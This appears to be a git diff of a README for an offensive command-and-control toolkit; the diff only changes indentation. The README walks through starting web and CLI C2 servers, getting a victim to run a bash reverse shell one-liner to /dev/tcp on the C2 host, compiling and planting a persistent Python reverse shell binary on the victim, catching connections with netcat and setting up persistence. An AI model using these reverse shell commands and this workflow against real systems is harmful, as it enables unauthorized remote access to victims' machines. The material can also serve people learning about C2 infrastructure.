@@ -19,50 +19,50 @@ Build and understand C2 infrastructure.
 
 # Web C2 server 
 1. Start the server
-  - `python3 deathstar-web.py`
+    - `python3 deathstar-web.py`
 2. Open link in web browser
-  - `firefox 127.0.0.1:5000`
+    - `firefox 127.0.0.1:5000`
 3. Have Victim connect to C2
-  - Linux / MacOS
-    - This will drop the moment the C2 server 'drops'
-    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
-  - Python reverse shell
-    - This will continue to connect to the C2 server even after it 'drops'
-    - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-    - `bash compiler.sh stardestroyer.py`
-    - Copy `stardestoryer` to VICTIM
-    - `chmod +x stardestroyer`
-    - `./stardestroyer`
+    - Linux / MacOS
+      - This will drop the moment the C2 server 'drops'
+      - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+    - Python reverse shell
+      - This will continue to connect to the C2 server even after it 'drops'
+      - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
+      - `bash compiler.sh stardestroyer.py`
+      - Copy `stardestoryer` to VICTIM
+      - `chmod +x stardestroyer`
+      - `./stardestroyer`
 4. Start your listener 
-  - `nc -nvlp 4444`
+    - `nc -nvlp 4444`
 5. Forward the connection to your listener
-  - On the webpage, type the IP of the listening device, and then click forward.
+    - On the webpage, type the IP of the listening device, and then click forward.
 6. Catch the connection
-  - Once you've caught the connection, begin setting up persistence.
+    - Once you've caught the connection, begin setting up persistence.
 7. Wash, rince, repeat.
 
 # CLI C2 server
 1. Start the server
-  - `python3 deathstar-term.py`
+    - `python3 deathstar-term.py`
 2. Have Victim connect to C2
-  - Linux / MacOS
-    - This will drop the moment the C2 server 'drops'
-    - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
-  - Python reverse shell
-    - This will continue to connect to the C2 server even after it 'drops'
-    - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
-    - `bash compiler.sh stardestroyer.py`
-    - Copy `stardestoryer` to VICTIM
-    - `chmod +x stardestroyer`
-    - `./stardestroyer`
+    - Linux / MacOS
+      - This will drop the moment the C2 server 'drops'
+      - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+    - Python reverse shell
+      - This will continue to connect to the C2 server even after it 'drops'
+      - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
+      - `bash compiler.sh stardestroyer.py`
+      - Copy `stardestoryer` to VICTIM
+      - `chmod +x stardestroyer`
+      - `./stardestroyer`
 3. Start your listener 
-  - `nc -nvlp 4444`
+    - `nc -nvlp 4444`
 4. Forward the connection to your listener
-  - On the CLI, list the connections.
-    - Select `2)` to forward.
-    - Specify the `ID` of the `VICTIM` you'd like to forward.
-    - Then, type the IP of your `LISTENING` device.
+    - On the CLI, list the connections.
+      - Select `2)` to forward.
+      - Specify the `ID` of the `VICTIM` you'd like to forward.
+      - Then, type the IP of your `LISTENING` device.
 5.Catch the connection
-  - Once you've caught the connection, begin setting up persistence.
+    - Once you've caught the connection, begin setting up persistence.
 6. Wash, rince, repeat.
 
